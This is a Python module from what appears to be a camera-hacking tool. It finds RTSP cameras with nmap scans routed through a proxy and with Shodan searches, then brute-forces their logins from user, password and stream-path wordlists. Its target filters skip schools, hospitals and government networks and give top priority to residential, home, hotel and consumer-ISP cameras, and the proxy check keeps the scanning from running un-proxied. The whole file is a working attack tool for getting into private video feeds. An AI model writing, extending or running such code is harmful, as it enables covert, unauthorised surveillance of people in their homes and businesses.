import itertools
import logging
import random
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor
from typing import Dict

import nmap
import shodan
from pydantic import BaseModel, ConfigDict, Field
from shodan import APIError

from models.camera import Camera
from models.managers import CameraRepository
from scanners.config import CheckersConfig, NmapConfig, ShodanConfig
from scanners.proxy import TwoCaptchaProxy
from scanners.rtsp_probe import RtspProbe, RtspTarget

__version__ = "0.1.0"

# nmap --proxies only relays through HTTP/SOCKS4 (see `nmap --help`); a socks5
# proxy is rejected, so NmapTask must be given one of these.
_NMAP_PROXY_SCHEMES = ("http", "socks4", "socks4a")

# nmap's port state for a service that accepted the connection.
_OPEN_STATE = "open"


class UnsupportedProxySchemeError(Exception):
    """nmap cannot relay this proxy scheme, so the scan would run un-proxied."""


class _Location(BaseModel):
    model_config = ConfigDict(extra="ignore")

    city: str | None = None
    country_code: str | None = None
    country_name: str | None = None
    region_code: str | None = None


class ShodanBanner(BaseModel):
    """The subset of a Shodan search banner this scanner cares about."""

    model_config = ConfigDict(extra="ignore")

    ip_str: str
    port: int
    location: _Location = Field(default_factory=_Location)
    org: str = ""  # ISP/org name from Shodan
    hostnames: list[str] = Field(default_factory=list)
    tags: list[str] = Field(default_factory=list)


class Task(ABC):
    """Base task: holds a validated config model and a camera repository."""

    def __init__(self, config: BaseModel, repository: CameraRepository = None):
        if config is None:
            raise ValueError("Config is required")
        self.config = config
        self.repository = repository or CameraRepository()

    @abstractmethod
    def run(self) -> None:
        raise NotImplementedError("You must implement the run method")


class NmapTask(Task):
    """Scan a network range with nmap and store the hosts that answer on RTSP."""

    def __init__(
        self,
        config: NmapConfig,
        proxy: TwoCaptchaProxy = None,
        repository: CameraRepository = None,
    ):
        super().__init__(config, repository)
        self.proxy = proxy
        self.scanner = nmap.PortScanner()

    def run(self) -> None:
        logging.info(f"Starting nmap scanning on {self.config.ip_range}")

        hosts = self._scan(self.config.ip_range)
        logging.info(f"Found {len(hosts)} hosts using nmap scan")

        self._write_xml()
        for host, host_data in hosts.items():
            self._store_open_ports(host, host_data)
        logging.info("Executors: finished nmap scan")

    def _write_xml(self) -> None:
        """Keep the run's raw nmap XML, where the vuln mode reads it.

        python-nmap owns the XML: it rejects an `-oX` argument of ours, so the
        only way to keep the run's output is to ask it for the last one it made.
        That is the raw stdout of `nmap -oX -`, so it is bytes, despite the
        method's docstring saying string.
        """
        with open(self.config.xml_path, "wb") as handle:
            handle.write(self.scanner.get_nmap_last_output())
        logging.info(f"nmap XML written to {self.config.xml_path}")

    def _store_open_ports(self, host: str, host_data: Dict) -> None:
        """Store the host's open ports only.

        nmap reports every scanned port, closed and filtered included; only an
        open one is a camera, otherwise each live host lands in the DB as a
        camera the check task then burns a full credential run on.
        """
        for port, port_data in host_data.get("tcp", {}).items():
            if port_data["state"] != _OPEN_STATE:
                continue
            self.repository.insert_camera(Camera(ip=host, port=port))
            logging.debug(f"Added on db {host}:{port}")

    def _scan(self, target: str) -> Dict:
        arguments = f"-p 554 -sV{self._proxy_arguments()}"
        if self.config.parallelism > 0:
            arguments += f" -T4 --min-parallelism {self.config.parallelism}"
        response = self.scanner.scan(hosts=target, arguments=arguments)
        return response.get("scan")

    def _proxy_arguments(self) -> str:
        """`--proxies <url>`, or nothing when no proxy is configured.

        No proxy is a deliberate direct scan (proxy.enabled: false). With one
        set, a scheme nmap cannot relay raises instead of quietly dropping the
        flag, so a public scan never runs un-proxied by accident.
        """
        if self.proxy is None:
            return ""
        proxy_url = self.proxy.url()
        scheme = proxy_url.split("://", 1)[0].lower()
        if scheme not in _NMAP_PROXY_SCHEMES:
            raise UnsupportedProxySchemeError(
                f"nmap --proxies supports {_NMAP_PROXY_SCHEMES}, got {scheme!r}; "
                "give NmapTask an http proxy (TwoCaptchaSettings(protocol='http')). "
                "Failing loud so the scan never silently runs un-proxied."
            )
        return f" --proxies {proxy_url}"


class ShodanTask(Task):
    """Search Shodan for cameras and store the new ones in the database."""

    config: ShodanConfig

    _BLOCKED_ORGS: frozenset[str] = frozenset(
        {
            "university",
            "college",
            "school",
            "education",
            "hospital",
            "medical",
            "clinic",
            "government",
            "military",
            "municipality",
            "library",
            "museum",
            "church",
            "mosque",
            "at&t",
            "comcast",
            "verizon",
            "spectrum",
            "xfinity",
            "charter",
            "cox",
            "frontier",
        }
    )

    _BLOCKED_TAGS: frozenset[str] = frozenset(
        {
            "university",
            "college",
            "school",
            "education",
            "hospital",
            "medical",
            "clinic",
            "government",
            "military",
            "municipality",
            "library",
            "museum",
            "church",
            "mosque",
        }
    )

    _PRIORITY_TAGS: frozenset[str] = frozenset(
        {
            "residential",
            "home",
            "office",
            "business",
            "company",
            "enterprise",
            "corporate",
            "apartment",
            "hotel",
            "motel",
        }
    )

    _PRIORITY_ORGS: frozenset[str] = frozenset(
        {
            "comcast",
            "verizon",
            "at&t",
            "spectrum",
            "xfinity",
            "charter",
            "cox",
            "frontier",
        }
    )

    def run(self) -> None:
        api = shodan.Shodan(self.config.api_key)
        query = self.config.query
        logging.info("Updating database")

        cams_added = 0
        try:
            for raw in api.search_cursor(query):
                banner = ShodanBanner(**raw)
                if self.repository.find(banner.ip_str, banner.port):
                    continue
                category = self._classify_banner(banner)
                if category is None:
                    logging.debug(
                        "Skipped %s:%d (blocked org/tag)", banner.ip_str, banner.port
                    )
                    continue
                if category == "low":
                    if not self._should_skip_low_priority():
                        continue
                self.repository.insert_camera(
                    Camera(
                        ip=banner.ip_str,
                        port=banner.port,
                        city=banner.location.city,
                        country_code=banner.location.country_code,
                        country_name=banner.location.country_name,
                        region_code=banner.location.region_code,
                    )
                )
                logging.debug(
                    "%s:%d added (priority=%s)", banner.ip_str, banner.port, category
                )
                cams_added += 1
            logging.info(f"{cams_added} cameras added")
        except APIError as e:
            logging.error(f"Shodan api error: {e}")

    _LOW_PRIORITY_COUNT: int = 0
    _LOW_PRIORITY_LIMIT: int = 50

    @classmethod
    def _should_skip_low_priority(cls) -> bool:
        cls._LOW_PRIORITY_COUNT += 1
        return cls._LOW_PRIORITY_COUNT > cls._LOW_PRIORITY_LIMIT

    @classmethod
    def _classify_banner(cls, banner: ShodanBanner) -> str | None:
        """Classify a Shodan banner into priority tier."""
        org_lower = banner.org.lower() if banner.org else ""
        tags_lower = {tag.lower() for tag in banner.tags}
        hostnames_lower = {hostname.lower() for hostname in banner.hostnames}
        if cls._is_blocked_org(org_lower):
            return None
        if cls._has_blocked_tag(tags_lower):
            return None
        if cls._has_blocked_hostname(hostnames_lower):
            return None
        if cls._is_priority_org(org_lower):
            return "high"
        if cls._has_priority_tag(tags_lower):
            return "high"
        return "medium"

    @classmethod
    def _is_blocked_org(cls, org_lower: str) -> bool:
        return org_lower in cls._BLOCKED_ORGS

    @classmethod
    def _has_blocked_tag(cls, tags_lower: set[str]) -> bool:
        return bool(tags_lower & cls._BLOCKED_TAGS)

    @classmethod
    def _has_blocked_hostname(cls, hostnames_lower: set[str]) -> bool:
        for hostname in hostnames_lower:
            domain = hostname.split(".")[-1]
            if domain in cls._BLOCKED_TAGS:
                return True
        return False

    @classmethod
    def _is_priority_org(cls, org_lower: str) -> bool:
        return org_lower in cls._PRIORITY_ORGS

    @classmethod
    def _has_priority_tag(cls, tags_lower: set[str]) -> bool:
        return bool(tags_lower & cls._PRIORITY_TAGS)


class CheckTask(Task):
    """Try RTSP credential combinations against inactive cameras in the database."""

    def __init__(
        self,
        config: CheckersConfig,
        repository: CameraRepository = None,
        probe: RtspProbe = None,
    ):
        super().__init__(config, repository)
        self.probe = probe or RtspProbe()

    def run(self) -> None:
        logging.info("Starting check task")
        users = self._read_lines(self.config.wordlist_users)
        passwords = self._read_lines(self.config.wordlist_passwords)
        rtsp_urls = self._read_lines(self.config.wordlist_rtsp_urls)

        if self.config.randomize:
            random.shuffle(users)
            random.shuffle(passwords)
            random.shuffle(rtsp_urls)

        cameras = self.repository.get_random_inactive()
        logging.debug(f"Testing {len(cameras)} cameras")

        combinations = itertools.product(rtsp_urls, users, passwords, cameras)
        targets = (
            RtspTarget(
                host=camera.ip,
                port=camera.port,
                user=user,
                password=password,
                url_template=url_template,
            )
            for url_template, user, password, camera in combinations
        )
        # concurrency workers probe in parallel (I/O-bound); results are consumed
        # here on one thread so set_active stays serial. map preserves order and
        # pulls the target generator lazily, so all combos are never materialised.
        with ThreadPoolExecutor(max_workers=self.config.concurrency) as pool:
            for found in pool.map(self.probe.probe, targets):
                if found:
                    self.repository.set_active(found)
        logging.info("Executors: finished testing cameras")

    @staticmethod
    def _read_lines(path):
        with open(path, "r") as f:
            return f.read().splitlines()
